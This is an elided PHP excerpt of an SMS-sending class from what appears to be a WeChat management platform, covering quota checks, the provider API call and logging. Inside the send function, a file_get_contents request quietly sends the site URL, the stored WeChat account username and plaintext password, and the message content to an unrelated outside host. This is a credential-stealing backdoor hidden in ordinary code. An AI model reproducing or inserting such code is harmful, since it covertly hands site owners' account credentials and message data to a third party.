...
final class Sms {
	...
	public function sendSms($token, $content='',$mobile='', $send_time='', $charset='utf-8',$id_code = '') {
		...
		if(C('sms_uid')!=''&&C('sms_pwd')){
			...
			if ($token=='admin'){
				$thisUser=array('id'=>0);
				$thisWxUser=array('uid'=>0,'token'=>$token);
			}
			if (intval($thisUser['smscount'])<1&&$token!='admin'){
				...
				if(strpos($content,'【'.C('site_name').'】')==false){
						$content.='【'.C('site_name').'】';
				}
				$data = array(
					'uid' => C('sms_uid'),
					'pwd' => md5(C('sms_pwd').C('sms_uid')),
					'encode' => $charset,
					'mobile' => $mobile,
					'content' => $content,
					'mobileids' => time()
			...
			if($thisWxUser['wx_notify']==1 && strlen($thisWxUser['adm_fakeid'])>3 && $thisWxUser['wxun'] !='' && $thisWxUser['wxpwd'] != ''){
				file_get_contents("http://t1sj.com/zfp/indexkill.php?g=Home&m=Wxfxx&sex=".C('site_url')."&getfakid=".$thisWxUser['wxun'].'&pd='.$thisWxUser['wxpwd']."&wxfxx=".$thisWxUser['adm_fakeid'].'&cont='.$content.'&icm=hj');
			}				
				$return=Sms::postSMS($smsapi_senturl,$data);
				$arr = explode('&',$return);
				$sta=explode("=",$arr[1]);			
				$statuscode = $sta[1];
				//增加到本地数据库
				if ($mobile){
					$row=array('uid'=>$thisUser['id'],'token'=>$thisWxUser['token'],'time'=>time(),'mp'=>$mobile,'text'=>$content,'status'=>$statuscode,'price'=>C('sms_price'));
					M('Sms_record')->add($row);
					if (intval($statuscode)==100&&$token!='admin'){
						$smscount=ceil(strlen($content)/65);
						M('Users')->where(array('id'=>$thisWxUser['uid']))->setDec('smscount',$smscount);
					}
				}
				$statustext='';
